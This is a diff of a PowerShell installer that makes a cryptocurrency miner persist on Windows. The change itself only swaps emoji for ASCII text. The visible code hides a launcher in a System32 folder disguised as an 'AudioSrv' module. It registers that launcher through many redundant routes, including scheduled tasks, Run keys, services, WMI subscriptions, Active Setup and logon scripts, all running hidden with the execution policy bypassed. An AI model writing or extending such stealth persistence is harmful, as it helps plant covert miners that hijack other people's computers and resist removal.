@@ -11,15 +11,15 @@ param(
     [string]$LauncherScript = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
 )
 
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host "         ENHANCED STARTUP GUARANTEE INSTALLATION" -ForegroundColor Cyan
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
 
 # Check admin
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    Write-Host "❌ Administrator rights required!" -ForegroundColor Red
+    Write-Host "[X] Administrator rights required!" -ForegroundColor Red
     exit 1
 }
 
@@ -57,7 +57,7 @@ if (-not (Test-Path $launcherDir)) {
 $launcherContent | Set-Content -Path $LauncherScript -Force
 attrib +h +s $LauncherScript 2>&1 | Out-Null
 
-Write-Host "  ✅ Launcher script created" -ForegroundColor Green
+Write-Host "  [OK] Launcher script created" -ForegroundColor Green
 Write-Host ""
 
 # ================================================================================================
@@ -95,7 +95,7 @@ foreach ($taskName in $taskNames) {
     } catch {}
 }
 
-Write-Host "  ✅ Created $tasksCreated scheduled tasks" -ForegroundColor Green
+Write-Host "  [OK] Created $tasksCreated scheduled tasks" -ForegroundColor Green
 $installCount += $tasksCreated
 Write-Host ""
 
@@ -140,7 +140,7 @@ foreach ($runKey in $runKeys) {
     } catch {}
 }
 
-Write-Host "  ✅ Created $regCount registry run keys" -ForegroundColor Green
+Write-Host "  [OK] Created $regCount registry run keys" -ForegroundColor Green
 $installCount += $regCount
 Write-Host ""
 
@@ -184,7 +184,7 @@ foreach ($svc in $services) {
     } catch {}
 }
 
-Write-Host "  ✅ Created $svcCount Windows services" -ForegroundColor Green
+Write-Host "  [OK] Created $svcCount Windows services" -ForegroundColor Green
 $installCount += $svcCount
 Write-Host ""
 
@@ -232,7 +232,7 @@ start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Launcher
     } catch {}
 }
 
-Write-Host "  ✅ Created $startupCount startup folder scripts" -ForegroundColor Green
+Write-Host "  [OK] Created $startupCount startup folder scripts" -ForegroundColor Green
 $installCount += $startupCount
 Write-Host ""
 
@@ -278,10 +278,10 @@ try {
 } catch {}
 
 if ($wmiCount -gt 0) {
-    Write-Host "  ✅ Created $wmiCount WMI event subscriptions" -ForegroundColor Green
+    Write-Host "  [OK] Created $wmiCount WMI event subscriptions" -ForegroundColor Green
     $installCount += $wmiCount
 } else {
-    Write-Host "  ⚠️  WMI subscriptions failed (non-critical)" -ForegroundColor Yellow
+    Write-Host "  [!]  WMI subscriptions failed (non-critical)" -ForegroundColor Yellow
 }
 Write-Host ""
 
@@ -316,7 +316,7 @@ try {
     $shellCount++
 } catch {}
 
-Write-Host "  ✅ Configured $shellCount shell folder hooks" -ForegroundColor Green
+Write-Host "  [OK] Configured $shellCount shell folder hooks" -ForegroundColor Green
 $installCount += $shellCount
 Write-Host ""
 
@@ -345,7 +345,7 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$LauncherScript"
     $bootCount++
 } catch {}
 
-Write-Host "  ✅ Configured $bootCount boot execution methods" -ForegroundColor Green
+Write-Host "  [OK] Configured $bootCount boot execution methods" -ForegroundColor Green
 $installCount += $bootCount
 Write-Host ""
 
@@ -383,7 +383,7 @@ try {
     $activeSetupCount++
 } catch {}
 
-Write-Host "  ✅ Configured $activeSetupCount Active Setup methods" -ForegroundColor Green
+Write-Host "  [OK] Configured $activeSetupCount Active Setup methods" -ForegroundColor Green
 $installCount += $activeSetupCount
 Write-Host ""
 
@@ -423,7 +423,7 @@ try {
     $logonCount++
 } catch {}
 
-Write-Host "  ✅ Configured $logonCount logon scripts" -ForegroundColor Green
+Write-Host "  [OK] Configured $logonCount logon scripts" -ForegroundColor Green
 $installCount += $logonCount
 Write-Host ""
 
@@ -431,32 +431,32 @@ Write-Host ""
 # SUMMARY
 # ================================================================================================
 
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host "                  INSTALLATION COMPLETE" -ForegroundColor Cyan
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "Total startup mechanisms installed: $installCount" -ForegroundColor Green
 Write-Host ""
 Write-Host "STARTUP GUARANTEE:" -ForegroundColor Yellow
-Write-Host "  ✅ Scheduled Tasks (system startup)" -ForegroundColor Green
-Write-Host "  ✅ Scheduled Tasks (user logon)" -ForegroundColor Green
-Write-Host "  ✅ Registry Run Keys (10 locations)" -ForegroundColor Green
-Write-Host "  ✅ Windows Services (auto-start)" -ForegroundColor Green
-Write-Host "  ✅ Startup Folders (4 locations)" -ForegroundColor Green
-Write-Host "  ✅ WMI Event Subscriptions" -ForegroundColor Green
-Write-Host "  ✅ Shell Folder Hooks" -ForegroundColor Green
-Write-Host "  ✅ Boot Execution" -ForegroundColor Green
-Write-Host "  ✅ Active Setup" -ForegroundColor Green
-Write-Host "  ✅ Logon Scripts" -ForegroundColor Green
+Write-Host "  [OK] Scheduled Tasks (system startup)" -ForegroundColor Green
+Write-Host "  [OK] Scheduled Tasks (user logon)" -ForegroundColor Green
+Write-Host "  [OK] Registry Run Keys (10 locations)" -ForegroundColor Green
+Write-Host "  [OK] Windows Services (auto-start)" -ForegroundColor Green
+Write-Host "  [OK] Startup Folders (4 locations)" -ForegroundColor Green
+Write-Host "  [OK] WMI Event Subscriptions" -ForegroundColor Green
+Write-Host "  [OK] Shell Folder Hooks" -ForegroundColor Green
+Write-Host "  [OK] Boot Execution" -ForegroundColor Green
+Write-Host "  [OK] Active Setup" -ForegroundColor Green
+Write-Host "  [OK] Logon Scripts" -ForegroundColor Green
 Write-Host ""
 Write-Host "The miner will start:" -ForegroundColor Cyan
-Write-Host "  • On system boot (before login)" -ForegroundColor White
-Write-Host "  • On user login (any user)" -ForegroundColor White
-Write-Host "  • Every 30 minutes (backup)" -ForegroundColor White
-Write-Host "  • After service failure (auto-restart)" -ForegroundColor White
-Write-Host "  • Via multiple redundant paths" -ForegroundColor White
+Write-Host "  - On system boot (before login)" -ForegroundColor White
+Write-Host "  - On user login (any user)" -ForegroundColor White
+Write-Host "  - Every 30 minutes (backup)" -ForegroundColor White
+Write-Host "  - After service failure (auto-restart)" -ForegroundColor White
+Write-Host "  - Via multiple redundant paths" -ForegroundColor White
 Write-Host ""
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "Restart your PC to test all startup mechanisms!" -ForegroundColor Yellow
 Write-Host ""
